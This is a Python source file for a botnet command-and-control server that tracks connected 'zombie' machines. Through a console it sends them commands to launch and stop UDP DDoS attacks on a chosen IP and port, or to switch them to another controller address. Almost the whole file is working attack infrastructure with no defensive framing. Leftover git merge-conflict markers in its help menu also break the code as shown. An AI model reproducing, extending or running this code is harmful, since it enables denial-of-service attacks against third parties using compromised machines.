import socket
import threading
import os
import pickle

# creates server socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(("0.0.0.0", 420))
sock.listen(1)

con = []
add = []

# listens for new connections and dedicates a thread to them
def listener():
    while True:
        c, a = sock.accept()
        if c != None:
            con.append(c)
            add.append(a)
            c = None

# updates connections and addresses
def check():
    for i in range(0, len(con)):
        try:
            con[i].send("Are you alive?".encode("utf-8"))
        except:
            try:
                con.pop(i)
                add.pop(i)
            except:
                pass

# sends command to each connection
def send_all(command):
    check()
    command = pickle.dumps(command)
    for i in range(len(con)):
        con[i].send(command)

# user interface of the server
def userInterface():
    while True:
        print(">", end="")
        command = input().lower().split(" ")
        if command[0] == "help":
            print()
            print("ADD            Shows a list of every connected ip address.")
            print("CLS            Clears command prompt.")
<<<<<<< HEAD
            print("CON            Maximum number of connections.")
            print("QUIT           Quits server.")
            print("EXT            Changes the address that zombies connect to.")
=======
            print("EXIT           Exits server.")
>>>>>>> 5f6353b66bd060f58f1a341eba41b5333074cb49
            print("HELP           Shows list of commands.")
            print("MSG            Sends a costom message to all connections.")
            print("STOP           Stops every active attack.")
            print("UDP            Starts a DDoS attack using UDP")
            print()
        elif command[0] == "cls":
            os.system("cls")
        elif command[0] == "quit":
            quit(0)
        elif command[0] == "add":
            check()
            if len(add) > 0:
                print(add)
            else:
                print("There are no connections!", end="\n\n")
        elif command[0] == "msg":
            try:
                send_all((command[0], command[1]))
            except:
                print("MSG {message}", end="\n\n")
        elif command[0] == "udp":
            try:
                send_all((command[0], command[1], int(command[2]), command[3]))
            except:
                print("UDP {ip} {port} {message}", end="\n\n")
        elif command[0] == "stop":
            try:
                send_all(["stop"])
            except:
                print("Failed to send stop!")
        elif command[0] == "ext":
            try:
                send_all((command[0], command[1], int(command[2])))
            except:
                print("EXT {ip} {port}", end="\n\n")

# runs in the beginning of the program
if __name__ == "__main__":
    threading.Thread(target=userInterface).start()
    threading.Thread(target=listener, daemon=True).start()